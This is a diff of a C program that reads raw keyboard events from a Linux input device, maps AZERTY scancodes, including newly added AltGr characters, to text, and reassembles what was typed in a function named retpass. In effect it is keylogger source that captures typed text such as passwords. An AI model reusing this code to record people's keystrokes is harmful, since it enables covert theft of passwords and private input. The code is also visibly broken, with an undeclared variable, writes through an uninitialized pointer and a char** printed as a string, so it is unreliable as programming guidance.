@@ -6,20 +6,22 @@
 #include <string.h>
 #include <stdio.h>
 
-char	retmaj(char dest)
+char retmaj(char dest)
 {
-  char	a;
+  char a;
+
   (dest >= 97 && dest <= 122) ? a = dest - 32 : 0;
+
   return (a);
 }
 
-char	*retmaj_bis(char *dest)
+char *retmaj_bis(char *dest)
 {
-  char	*a;
+  char *a;
 
   (strcmp(dest, "&") == 0) ? a = "1" : 0;
   (strcmp(dest, "é") == 0) ? a = "2" : 0;
-  //(strcmp(dest, 34) == 0) ? a = "3" : 0;
+  (*dest == 34) ? a = "3" : 0;
   (strcmp(dest, "'") == 0) ? a = "4" : 0;
   (strcmp(dest, "(") == 0) ? a = "5" : 0;
   (strcmp(dest, "-") == 0) ? a = "6" : 0;
@@ -41,9 +43,9 @@ char	*retmaj_bis(char *dest)
   return (a);
 }
 
-int	strlencharchar(char **dest)
+int strlencharchar(char **dest)
 {
-  int	i;
+  int i;
 
   i = 0;
   while (dest[i] != 0)
@@ -51,10 +53,11 @@ int	strlencharchar(char **dest)
   return (i);
 }
 
-char	*convert_to_key(int nb)
+char *convert_to_key(int nb)
 {
-  char	**dest;
-  dest = malloc(sizeof(char) * 128);
+  char **dest;
+  dest = malloc(sizeof(char *) * 128);
+  dest[4] = malloc(sizeof(char));
   dest[1] = "ECHAP";
   dest[59] = "F1";
   dest[60] = "F2";
@@ -74,7 +77,7 @@ char	*convert_to_key(int nb)
   dest[41] = "²";
   dest[2] = "&";
   dest[3] = "é";
-  dest[4] = 34;
+  *dest[4] = 34, dest[4][1] = '\0';
   dest[5] = "'";
   dest[6] = "(";
   dest[7] = "-";
@@ -144,18 +147,38 @@ char	*convert_to_key(int nb)
   return (dest[nb]);
 }
 
-char	**convert_to_real(char **dest)
+char *retaltgr(char *dest)
 {
-  int	i;
-  int	j;
-  char	**str;
+  char *a;
+
+  a = malloc(sizeof(char) * 2);
+  (strcmp(dest, "é") == 0) ? a = "~" : 0;
+  (*dest == 34) ? a = "#": 0;
+  (strcmp(dest, "'") == 0) ? a = "{" : 0;
+  (strcmp(dest, "(") == 0) ? a = "[" : 0;
+  (strcmp(dest, "-") == 0) ? a = "|" : 0;
+  (strcmp(dest, "è") == 0) ? a = "`" : 0;
+  (strcmp(dest, "_") == 0) ? *a = 92, a[1] = '\0' : 0;
+  (strcmp(dest, "ç") == 0) ? a = "^" : 0;
+  (strcmp(dest, "à") == 0) ? a = "@" : 0;
+  (strcmp(dest, ")") == 0) ? a = "]" : 0;
+  (strcmp(dest, "=") == 0) ? a = "}" : 0;
+  (strcmp(dest, "$") == 0) ? a = "ø" : 0;
+  return (a);
+}
+
+char **convert_to_real(char **dest)
+{
+  int i;
+  int j;
+  char **str;
 
   str = malloc(sizeof(char *) * strlencharchar(dest));
   i = 0;
   (strcmp(dest[0], "ENTREE") == 0) ? i++ : 0;
   while (dest[i] != 0)
     {
-      if (strcmp(dest[i], "RSHIFT") != 0 && strcmp(dest[i], "LSHIFT") != 0 && strcmp(dest[i], " ") != 0)
+      if (strcmp(dest[i], "ALTGR") != 0 && strcmp(dest[i], "RSHIFT") != 0 && strcmp(dest[i], "LSHIFT") != 0 && strcmp(dest[i], " ") != 0)
 	{
 	  j = i + 1;
 	  while (strcmp(dest[i], dest[j]) != 0)
@@ -212,6 +235,24 @@ char	**convert_to_real(char **dest)
 	  str[j] = strdup(dest[j]);
 	  i = j + 1;
 	}
+      else if (strcmp(dest[i],"ALTGR") == 0)
+	{
+	  str[i] = strdup(dest[i]);
+	  j = i + 1;
+	  while (strcmp(dest[j], dest[i]) != 0)
+	    {
+	      if (strlen(dest[j]) <= 2 && strcmp(dest[j], " ") != 0)
+		{
+		  str[j] = malloc(sizeof(char));
+		  str[j] = retaltgr(dest[j]);
+		}
+	      else
+		str[j] = strdup(dest[j]);
+	      j++;
+	    }
+	  str[j] = strdup(dest[j]);
+	  i = j + 1;
+	}
       else
 	{
 	  str[i] = strdup(dest[i]);
@@ -219,19 +260,21 @@ char	**convert_to_real(char **dest)
 	}
     }
   str[i] = 0;
+  free(dest);
+  printf("%s\n", str);
   return (str);
 }
 
-void	retpass(char **dest)
+char *retpass(char **dest)
 {
-  int	i;
-  int	j;
-  char	*d;
+  int i;
+  int j;
+  char *d;
 
   i = j = 0;
   while (dest[i] != 0)
     {
-      if (strcmp(dest[i], " ") == 0 || strcmp(dest[i], "RSHIFT") == 0)
+      if (strcmp(dest[i], " ") == 0 || strcmp(dest[i], "RSHIFT") == 0 || strcmp(dest[i], "LSHIFT") == 0 || strcmp(dest[i], "ALTGR") == 0)
 	i++;
       else if (strcmp(dest[i], "ENTREE") == 0)
 	d[j++] = '\n', i++;
@@ -245,34 +288,36 @@ void	retpass(char **dest)
 	}
     }
   d[j] = 0;
-  write(1, d, strlen(d));
+  free(dest);
+
+  return (d);
+  //write(1, d, strlen(d));
 }
 
-int	main()
+int main()
 {
-  FILE *file;
   const char *dev = "/dev/input/by-path/platform-i8042-serio-0-event-kbd";
   struct input_event ev;
   ssize_t n;
   int fd;
-  int	i;
-  char buffer[400];
-  char	**dest;
+  int i;
+  char **dest;
+  char *path;
 
+  path = malloc(sizeof(char) * 1000);
   dest = malloc(sizeof(char *) * 1000);
   i = 0;
-  file = fopen("./log.txt", "w");
   fd = open(dev, O_RDONLY);
   if (fd == -1)
     {
       fprintf(stderr, "Cannot open %s: %s.\n", dev, strerror(errno));
       return EXIT_FAILURE;
     }
-  fread(buffer, 100, 1, file);
   while (1)
     {
+      k++;
       n = read(fd, &ev, sizeof ev);
-      if (n == (ssize_t)-1)
+      if (n == (ssize_t) - 1)
 	{
 	  if (errno == EINTR)
 	    continue;
@@ -288,33 +333,20 @@ int	main()
 	{
 	  if (strcmp(convert_to_key(ev.code), "ECHAP") == 0)
 	    break;
-	  fread(buffer, 100, 1, file);
 	  dest[i++] = convert_to_key(ev.code);
 	  dest[i++] = " ";
-	  //dest = strcat(dest, convert_to_key(ev.code));
-	  //dest[my_strlen(dest)] = '\n';
-	  //printf("%s\n", convert_to_key(ev.code));
 	}
       if (ev.type == EV_KEY && ev.value == 0)
 	{
-	  fread(buffer, 100, 1, file);
 	  dest[i++] = convert_to_key(ev.code);
 	  dest[i++] = " ";
-	  //dest = strcat(dest, convert_to_key(ev.code));
-	  //dest[my_strlen(dest)] = '\n';
-	  //printf("%s\n\n", convert_to_key(ev.code));
 	}
     }
-  //dest[my_strlen(dest) + 1] = 0;
   dest[i] = 0;
   dest = convert_to_real(dest);
-  retpass(dest);
-  //i = 0;
-  //  while (dest[i] != 0)
-  // printf("%s", dest[i++]);
-  //printf("%s\n", dest);
+  path = retpass(dest);
+  printf("%s\n", path);
+  write(1, path, strlen(path));
   fflush(stdout);
-  //fprintf(stderr, "%s.\n", strerror(errno));
-  fclose(file);
   return EXIT_FAILURE;
 }
